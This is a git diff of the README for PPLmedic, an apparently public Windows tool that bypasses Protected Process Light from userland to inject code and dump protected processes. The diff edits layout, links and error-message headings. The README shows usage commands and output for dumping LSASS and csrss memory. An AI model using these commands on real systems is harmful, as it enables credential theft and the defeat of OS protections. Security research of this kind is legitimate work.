@@ -1,14 +1,14 @@
 # PPLmedic
 
+<p align="center">
+  <img src="poc.png">
+</p>
+
 This tool implements a **Userland** exploit chain for injecting arbitrary code into a PPL with the signer type `Windows` and elevating to the signer type `WinTcb`. These techniques were originally discussed by James Forshaw (a.k.a. [@tiraniddo](https://infosec.exchange/@tiraniddo)) in his blog post [Injecting Code into Windows Protected Processes using COM - Part 1](https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html).
 
 To learn more about this tool, you should read its companion blog post here:
 
-- TODO: [Bypassing PPL in Userland (again)]()
-
-<p align="center">
-  <img src="poc.png">
-</p>
+- [Bypassing PPL in Userland (again)](https://blog.scrt.ch/2023/03/14/bypassing-ppl-in-userland-again/)
 
 ## 💣 Disclaimer
 
@@ -22,6 +22,7 @@ Prerequisites:
 
 - __Privileges:__ Administrator or SYSTEM with `SeDebugPrivilege`
 - __Platform:__ Windows 10/11 or Windows Server 2019/2022
+- __Architecture:__ Only __x86_64__ is supported
 
 ```bat
 REM Use the option -p to elevate from PPL-Windows to PPL-WinTcb
@@ -34,7 +35,7 @@ Dump a PPL-Windows or below (e.g.: LSASS):
 C:\WINDOWS\system32>tasklist | findstr lsass
 lsass.exe                      756 Services                   0     20,028 K
 
-C:\WINDOWS\system32>C:\Temp\PPLmedic.exe dump 756 c:\Temp\lsass.dmp -p
+C:\WINDOWS\system32>C:\Temp\PPLmedic.exe dump 756 c:\Temp\lsass.dmp
 [...]
 [+] Payload DLL successfully loaded after 272 attempts!
 [*] Deleting 272 temporary directories created by the service...
@@ -76,6 +77,8 @@ C:\WINDOWS\system32>C:\Temp\PPLmedic.exe dump 520 c:\Temp\csrss.dmp -p
 
 ## 🚧 Known issues
 
+### Error: "Unexpected error or timeout"
+
 You get the following error because the exploit __timed out__ while trying to create a remote `TaskHandler` COM object. This is usually the sign that the target service `WaaSMedicSvc` crashed. This can be confirmed with the next message: `[!] Service WaaSMedicSvc is no longer running`. __You should try to run the tool again.__
 
 ```console
@@ -89,6 +92,8 @@ C:\Windows\System32>C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp
 [...]
 ```
 
+### Error: "Reached the maximum number of attempts"
+
 You get the following error because the exploit failed to write a valid object directory in __less than 1000 attempts__. This limit serves as a failsafe to prevent the target service from consuming too much resources. __You should try to run the tool again.__
 
 ```console
@@ -101,6 +106,8 @@ C:\Windows\System32>C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp
 [...]
 ```
 
+### Error: "Failed to write LdrpKnownDllDirectoryHandle value"
+
 You get the following error because an unexpected error occurred when calling `LaunchDetectionOnly` or `LaunchRemediationOnly`. This should be quite rare though. __You should try to run the tool again.__
 
 ```console
@@ -112,6 +119,8 @@ C:\Windows\System32>C:\Temp\PPLmedic.exe dump 1234 C:\Temp\1234.dmp
 [-] Failed to write LdrpKnownDllDirectoryHandle value (thread exit code: 0x800706ba).
 [...]
 ```
+
+### Error: "Failed to cache sign ..."
 
 You get the following error because the exploit __failed to cache sign__ the payload DLL. The oplock set on the catalog file was probably never triggered because it was already opened by the Kernel. You can try to rerun the tool at a later time (for Windows 11, refer to the "Tests" section).
 
@@ -135,7 +144,7 @@ This Visual Studio Solution comprises two projects (the executable and a payload
 2. Select `Release / x64` (`x86` is not supported!).
 3. `Build > Build Solution`.
 
-## 🎓 Credits
+## 🎖 Credits
 
 - [@tiraniddo](https://infosec.exchange/@tiraniddo) - Injecting Code into Windows Protected Processes using COM - Part 1  
 [https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html](https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html)
